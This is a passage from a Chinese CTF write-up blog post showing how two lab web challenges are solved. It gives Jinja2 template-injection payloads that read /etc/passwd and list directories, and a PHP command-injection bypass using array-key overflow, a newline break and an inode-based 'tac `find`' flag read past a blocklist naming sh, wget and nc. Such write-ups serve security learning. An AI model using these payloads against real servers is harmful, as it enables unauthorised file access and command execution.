class="title">class</span> &#x27;<span class="title">jinja2</span>.<span class="title">runtime</span>.<span class="title">Context</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">jinja2</span>.<span class="title">runtime</span>.<span class="title">BlockReference</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">jinja2</span>.<span class="title">runtime</span>.<span class="title">LoopContextBase</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">jinja2</span>.<span class="title">runtime</span>.<span class="title">LoopContextIterator</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">jinja2</span>.<span class="title">runtime</span>.<span class="title">Macro</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">jinja2</span>.<span class="title">runtime</span>.<span class="title">Undefined</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">numbers</span>.<span class="title">Number</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">decimal</span>.<span class="title">Decimal</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">decimal</span>.<span class="title">_ContextManager</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">decimal</span>.<span class="title">Context</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">decimal</span>.<span class="title">_WorkRep</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">decimal</span>.<span class="title">_Log10Memoize</span>&#x27;&gt;, &lt;<span class="title">type</span> &#x27;<span class="title">_ast</span>.<span class="title">AST</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">jinja2</span>.<span class="title">lexer</span>.<span class="title">Failure</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">jinja2</span>.<span class="title">lexer</span>.<span class="title">TokenStreamIterator</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">jinja2</span>.<span class="title">lexer</span>.<span class="title">TokenStream</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">jinja2</span>.<span class="title">lexer</span>.<span class="title">Lexer</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">jinja2</span>.<span class="title">parser</span>.<span class="title">Parser</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">jinja2</span>.<span class="title">visitor</span>.<span class="title">NodeVisitor</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">jinja2</span>.<span class="title">idtracking</span>.<span class="title">Symbols</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">jinja2</span>.<span class="title">compiler</span>.<span class="title">MacroRef</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">jinja2</span>.<span class="title">compiler</span>.<span class="title">Frame</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">jinja2</span>.<span class="title">environment</span>.<span class="title">Template</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">jinja2</span>.<span class="title">environment</span>.<span class="title">TemplateModule</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">jinja2</span>.<span class="title">environment</span>.<span class="title">TemplateExpression</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">jinja2</span>.<span class="title">environment</span>.<span class="title">TemplateStream</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">jinja2</span>.<span class="title">loaders</span>.<span class="title">BaseLoader</span>&#x27;&gt;, &lt;<span class="title">type</span> &#x27;<span class="title">_io</span>.<span class="title">_IOBase</span>&#x27;&gt;, &lt;<span class="title">type</span> &#x27;<span class="title">_io</span>.<span class="title">IncrementalNewlineDecoder</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">jinja2</span>.<span class="title">bccache</span>.<span class="title">Bucket</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">jinja2</span>.<span class="title">bccache</span>.<span class="title">BytecodeCache</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">logging</span>.<span class="title">LogRecord</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">logging</span>.<span class="title">Formatter</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">logging</span>.<span class="title">BufferingFormatter</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">logging</span>.<span class="title">Filter</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">logging</span>.<span class="title">Filterer</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">logging</span>.<span class="title">PlaceHolder</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">logging</span>.<span class="title">Manager</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">logging</span>.<span class="title">LoggerAdapter</span>&#x27;&gt;, &lt;<span class="title">type</span> &#x27;<span class="title">datetime</span>.<span class="title">date</span>&#x27;&gt;, &lt;<span class="title">type</span> &#x27;<span class="title">datetime</span>.<span class="title">timedelta</span>&#x27;&gt;, &lt;<span class="title">type</span> &#x27;<span class="title">datetime</span>.<span class="title">time</span>&#x27;&gt;, &lt;<span class="title">type</span> &#x27;<span class="title">datetime</span>.<span class="title">tzinfo</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">werkzeug</span>.<span class="title">_internal</span>.<span class="title">_Missing</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">werkzeug</span>.<span class="title">_internal</span>.<span class="title">_DictAccessorProperty</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">werkzeug</span>.<span class="title">datastructures</span>.<span class="title">ImmutableListMixin</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">werkzeug</span>.<span class="title">datastructures</span>.<span class="title">ImmutableDictMixin</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">werkzeug</span>.<span class="title">datastructures</span>.<span class="title">UpdateDictMixin</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">werkzeug</span>.<span class="title">datastructures</span>.<span class="title">ViewItems</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">werkzeug</span>.<span class="title">datastructures</span>.<span class="title">_omd_bucket</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">werkzeug</span>.<span class="title">datastructures</span>.<span class="title">Headers</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">werkzeug</span>.<span class="title">datastructures</span>.<span class="title">ImmutableHeadersMixin</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">werkzeug</span>.<span class="title">datastructures</span>.<span class="title">IfRange</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">werkzeug</span>.<span class="title">datastructures</span>.<span class="title">Range</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">werkzeug</span>.<span class="title">datastructures</span>.<span class="title">ContentRange</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">werkzeug</span>.<span class="title">datastructures</span>.<span class="title">FileStorage</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">email</span>.<span class="title">LazyImporter</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">calendar</span>.<span class="title">Calendar</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">werkzeug</span>.<span class="title">urls</span>.<span class="title">Href</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">werkzeug</span>.<span class="title">utils</span>.<span class="title">HTMLBuilder</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">werkzeug</span>.<span class="title">wrappers</span>.<span class="title">accept</span>.<span class="title">AcceptMixin</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">werkzeug</span>.<span class="title">wrappers</span>.<span class="title">auth</span>.<span class="title">AuthorizationMixin</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">werkzeug</span>.<span class="title">wrappers</span>.<span class="title">auth</span>.<span class="title">WWWAuthenticateMixin</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">werkzeug</span>.<span class="title">wsgi</span>.<span class="title">ClosingIterator</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">werkzeug</span>.<span class="title">wsgi</span>.<span class="title">FileWrapper</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">werkzeug</span>.<span class="title">wsgi</span>.<span class="title">_RangeWrapper</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">werkzeug</span>.<span class="title">middleware</span>.<span class="title">dispatcher</span>.<span class="title">DispatcherMiddleware</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">werkzeug</span>.<span class="title">middleware</span>.<span class="title">http_proxy</span>.<span class="title">ProxyMiddleware</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">werkzeug</span>.<span class="title">middleware</span>.<span class="title">shared_data</span>.<span class="title">SharedDataMiddleware</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">werkzeug</span>.<span class="title">formparser</span>.<span class="title">FormDataParser</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">werkzeug</span>.<span class="title">formparser</span>.<span class="title">MultiPartParser</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">werkzeug</span>.<span class="title">wrappers</span>.<span class="title">base_request</span>.<span class="title">BaseRequest</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">werkzeug</span>.<span class="title">wrappers</span>.<span class="title">base_response</span>.<span class="title">BaseResponse</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">werkzeug</span>.<span class="title">wrappers</span>.<span class="title">common_descriptors</span>.<span class="title">CommonRequestDescriptorsMixin</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">werkzeug</span>.<span class="title">wrappers</span>.<span class="title">common_descriptors</span>.<span class="title">CommonResponseDescriptorsMixin</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">werkzeug</span>.<span class="title">wrappers</span>.<span class="title">etag</span>.<span class="title">ETagRequestMixin</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">werkzeug</span>.<span class="title">wrappers</span>.<span class="title">etag</span>.<span class="title">ETagResponseMixin</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">werkzeug</span>.<span class="title">wrappers</span>.<span class="title">user_agent</span>.<span class="title">UserAgentMixin</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">werkzeug</span>.<span class="title">wrappers</span>.<span class="title">request</span>.<span class="title">StreamOnlyMixin</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">werkzeug</span>.<span class="title">wrappers</span>.<span class="title">response</span>.<span class="title">ResponseStream</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">werkzeug</span>.<span class="title">wrappers</span>.<span class="title">response</span>.<span class="title">ResponseStreamMixin</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">werkzeug</span>.<span class="title">exceptions</span>.<span class="title">Aborter</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">uuid</span>.<span class="title">UUID</span>&#x27;&gt;, &lt;<span class="title">type</span> &#x27;<span class="title">CArgObject</span>&#x27;&gt;, &lt;<span class="title">type</span> &#x27;<span class="title">_ctypes</span>.<span class="title">CThunkObject</span>&#x27;&gt;, &lt;<span class="title">type</span> &#x27;<span class="title">_ctypes</span>.<span class="title">_CData</span>&#x27;&gt;, &lt;<span class="title">type</span> &#x27;<span class="title">_ctypes</span>.<span class="title">CField</span>&#x27;&gt;, &lt;<span class="title">type</span> &#x27;<span class="title">_ctypes</span>.<span class="title">DictRemover</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">ctypes</span>.<span class="title">CDLL</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">ctypes</span>.<span class="title">LibraryLoader</span>&#x27;&gt;, &lt;<span class="title">type</span> &#x27;<span class="title">select</span>.<span class="title">epoll</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">subprocess</span>.<span class="title">Popen</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">itsdangerous</span>.<span class="title">_json</span>.<span class="title">_CompactJSON</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">itsdangerous</span>.<span class="title">signer</span>.<span class="title">SigningAlgorithm</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">itsdangerous</span>.<span class="title">signer</span>.<span class="title">Signer</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">itsdangerous</span>.<span class="title">serializer</span>.<span class="title">Serializer</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">itsdangerous</span>.<span class="title">url_safe</span>.<span class="title">URLSafeSerializerMixin</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">flask</span>.<span class="title">_compat</span>.<span class="title">_DeprecatedBool</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">werkzeug</span>.<span class="title">local</span>.<span class="title">Local</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">werkzeug</span>.<span class="title">local</span>.<span class="title">LocalStack</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">werkzeug</span>.<span class="title">local</span>.<span class="title">LocalManager</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">werkzeug</span>.<span class="title">local</span>.<span class="title">LocalProxy</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">ast</span>.<span class="title">NodeVisitor</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">difflib</span>.<span class="title">HtmlDiff</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">werkzeug</span>.<span class="title">routing</span>.<span class="title">RuleFactory</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">werkzeug</span>.<span class="title">routing</span>.<span class="title">RuleTemplate</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">werkzeug</span>.<span class="title">routing</span>.<span class="title">BaseConverter</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">werkzeug</span>.<span class="title">routing</span>.<span class="title">Map</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">werkzeug</span>.<span class="title">routing</span>.<span class="title">MapAdapter</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">click</span>.<span class="title">_compat</span>.<span class="title">_FixupStream</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">click</span>.<span class="title">_compat</span>.<span class="title">_AtomicFile</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">click</span>.<span class="title">utils</span>.<span class="title">LazyFile</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">click</span>.<span class="title">utils</span>.<span class="title">KeepOpenFile</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">click</span>.<span class="title">utils</span>.<span class="title">PacifyFlushWrapper</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">click</span>.<span class="title">types</span>.<span class="title">ParamType</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">click</span>.<span class="title">parser</span>.<span class="title">Option</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">click</span>.<span class="title">parser</span>.<span class="title">Argument</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">click</span>.<span class="title">parser</span>.<span class="title">ParsingState</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">click</span>.<span class="title">parser</span>.<span class="title">OptionParser</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">click</span>.<span class="title">formatting</span>.<span class="title">HelpFormatter</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">click</span>.<span class="title">core</span>.<span class="title">Context</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">click</span>.<span class="title">core</span>.<span class="title">BaseCommand</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">click</span>.<span class="title">core</span>.<span class="title">Parameter</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">flask</span>.<span class="title">signals</span>.<span class="title">Namespace</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">flask</span>.<span class="title">signals</span>.<span class="title">_FakeSignal</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">flask</span>.<span class="title">helpers</span>.<span class="title">locked_cached_property</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">flask</span>.<span class="title">helpers</span>.<span class="title">_PackageBoundObject</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">flask</span>.<span class="title">cli</span>.<span class="title">DispatchingApp</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">flask</span>.<span class="title">cli</span>.<span class="title">ScriptInfo</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">flask</span>.<span class="title">config</span>.<span class="title">ConfigAttribute</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">flask</span>.<span class="title">ctx</span>.<span class="title">_AppCtxGlobals</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">flask</span>.<span class="title">ctx</span>.<span class="title">AppContext</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">flask</span>.<span class="title">ctx</span>.<span class="title">RequestContext</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">flask</span>.<span class="title">json</span>.<span class="title">tag</span>.<span class="title">JSONTag</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">flask</span>.<span class="title">json</span>.<span class="title">tag</span>.<span class="title">TaggedJSONSerializer</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">flask</span>.<span class="title">sessions</span>.<span class="title">SessionInterface</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">werkzeug</span>.<span class="title">wrappers</span>.<span class="title">json</span>.<span class="title">_JSONModule</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">werkzeug</span>.<span class="title">wrappers</span>.<span class="title">json</span>.<span class="title">JSONMixin</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">flask</span>.<span class="title">blueprints</span>.<span class="title">BlueprintSetupState</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">werkzeug</span>.<span class="title">serving</span>.<span class="title">WSGIRequestHandler</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">jinja2</span>.<span class="title">ext</span>.<span class="title">Extension</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">jinja2</span>.<span class="title">ext</span>.<span class="title">_CommentFinder</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">werkzeug</span>.<span class="title">serving</span>.<span class="title">_SSLContext</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">werkzeug</span>.<span class="title">serving</span>.<span class="title">BaseWSGIServer</span>&#x27;&gt;, &lt;<span class="title">type</span> &#x27;<span class="title">unicodedata</span>.<span class="title">UCD</span>&#x27;&gt;, &lt;<span class="title">type</span> &#x27;<span class="title">array</span>.<span class="title">array</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">jinja2</span>.<span class="title">debug</span>.<span class="title">TracebackFrameProxy</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">jinja2</span>.<span class="title">debug</span>.<span class="title">ProcessedTraceback</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">werkzeug</span>.<span class="title">test</span>.<span class="title">_TestCookieHeaders</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">werkzeug</span>.<span class="title">test</span>.<span class="title">_TestCookieResponse</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">werkzeug</span>.<span class="title">test</span>.<span class="title">EnvironBuilder</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">werkzeug</span>.<span class="title">test</span>.<span class="title">Client</span>&#x27;&gt;, &lt;<span class="title">type</span> &#x27;<span class="title">method</span>-<span class="title">wrapper</span>&#x27;&gt;]</span></span><br></pre></td></tr></table></figure>



<p><strong>可以看到有一个type file类型(可以进行文件读取)</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; [].__class__.__base__.__subclasses__()[<span class="number">40</span>](<span class="string">&#x27;/etc/passwd&#x27;</span>).read() &#125;&#125;</span><br></pre></td></tr></table></figure>

<p>webflask4](D:\blog\pict\webflask4.png</p>
<p><strong>可以看到有一个 &lt;class ‘site._Printer’&gt;类型（可以进行命令执行）</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;<span class="string">&#x27;&#x27;</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__()[<span class="number">71</span>].__init__.__globals__[<span class="string">&#x27;os&#x27;</span>].listdir(<span class="string">&#x27;.&#x27;</span>)&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>D:\blog\pict\webflask5.png</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;<span class="string">&#x27;&#x27;</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__()[<span class="number">40</span>](<span class="string">&#x27;fl4g&#x27;</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure>

<h2 id="2-favorit-number"><a href="#2-favorit-number" class="headerlink" title="2.favorit_number"></a>2.favorit_number</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//php5.5.9</span></span><br><span class="line"><span class="variable">$stuff</span> = <span class="variable">$_POST</span>[<span class="string">&quot;stuff&quot;</span>];</span><br><span class="line"><span class="variable">$array</span> = [<span class="string">&#x27;admin&#x27;</span>, <span class="string">&#x27;user&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$stuff</span> === <span class="variable">$array</span> &amp;&amp; <span class="variable">$stuff</span>[<span class="number">0</span>] != <span class="string">&#x27;admin&#x27;</span>) &#123;  <span class="comment">#此处可用php5.5.9数组绕过，数组中键值为0的元素与键值为4294967296 //0x100000000 的元素是同一个</span></span><br><span class="line">    <span class="variable">$num</span>= <span class="variable">$_POST</span>[<span class="string">&quot;num&quot;</span>];</span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">&quot;/^\d+$/im&quot;</span>,<span class="variable">$num</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span> (!preg_match(<span class="string">&quot;/sh|wget|nc|python|php|perl|\?|flag|&#125;|cat|echo|\*|\^|\]|\\\\|&#x27;|\&quot;|\|/i&quot;</span>,<span class="variable">$num</span>))&#123;       <span class="comment">//这里进行了一个过滤，可以使用打开文件inum的方法</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;my favorite num is:&quot;</span>;                 <span class="comment">//以及%0a截断</span></span><br><span class="line">            system(<span class="string">&quot;echo &quot;</span>.<span class="variable">$num</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;Bonjour!&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#数组中键值为0的元素与键值为4294967296 //0x100000000 的元素是同一个</span></span><br></pre></td></tr></table></figure>

<p>D:\blog\pict\favonum1.png</p>
<p>所以绕过第一个if就需要构造stuff[4294967296]=admin&amp;stuff[1]=user&amp;num=123,成功绕过</p>
<p>D:\blog\pict\favonum2.png</p>
<p>在num处执行命令ls ./</p>
<p>D:\blog\pict\favonum3.png</p>
<p>ls ../../../../</p>
<p>D:\blog\pict\favonum4.png</p>
<p>ls / -i</p>
<p>D:\blog\pict\favonum5.png</p>
<p>tac <code>find / -inum=7342887</code></p>
<p>D:\blog\pict\favonum6.png</p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a target="_blank" rel="noopener" href="https://lionelkkk.github.io/">Lionel Kai</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://github.com/Lionelkkk/Lionelkkk.github.io/2022/02/13/exercise/">https://github.com/Lionelkkk/Lionelkkk.github.io/2022/02/13/exercise/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://github.com/Lionelkkk/Lionelkkk.github.io" target="_blank">Lionel</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/wp-orz/">wp orz</a></div><div class="post_share"><div class="social-share" data-image="/img/head.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2022/03/03/java/" title="java"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">java</div></div></a></div><div class="next-post pull-right"><a href="/2022/01/13/sql/" title="sql"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">sql</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/head.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">Lionel Kai</div><div class="author-info__description">树下有两个影子，一个是我的，另一个也是我的</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">9</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">3</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">2</div></a></div><a id="card-info-btn" href="https://github.com/Lionelkkk"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">实践是检验真理的唯一标准</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#1-BUUCTF%E2%80%94-WP"><span class="toc-number">1.</span> <span class="toc-text">1.BUUCTF—-WP</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E5%AE%89%E6%B4%B5%E6%9D%AF-2019-easy-serialize-php"><span class="toc-number">1.1.</span> <span class="toc-text">1.[安洵杯 2019]easy_serialize_php</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-De1CTF-2019-SSRF-Me"><span class="toc-number">1.2.</span> <span class="toc-text">2.[De1CTF 2019]SSRF Me</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-MRCTF2020-Ezpop"><span class="toc-number">1.3.</span> <span class="toc-text">3.[MRCTF2020]Ezpop</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-CISCN-2019-%E5%88%9D%E8%B5%9B-Love-Math"><span class="toc-number">1.4.</span> <span class="toc-text">4.[CISCN 2019 初赛]Love Math</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5-MRCTF2020-PYWebsite"><span class="toc-number">1.5.</span> <span class="toc-text">5.[MRCTF2020]PYWebsite</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#6-SWPU2019-Web1"><span class="toc-number">1.6.</span> <span class="toc-text">6.[SWPU2019]Web1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#7-SUCTF-2019-Pythonginx"><span class="toc-number">1.7.</span> <span class="toc-text">7.[SUCTF 2019]Pythonginx</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" 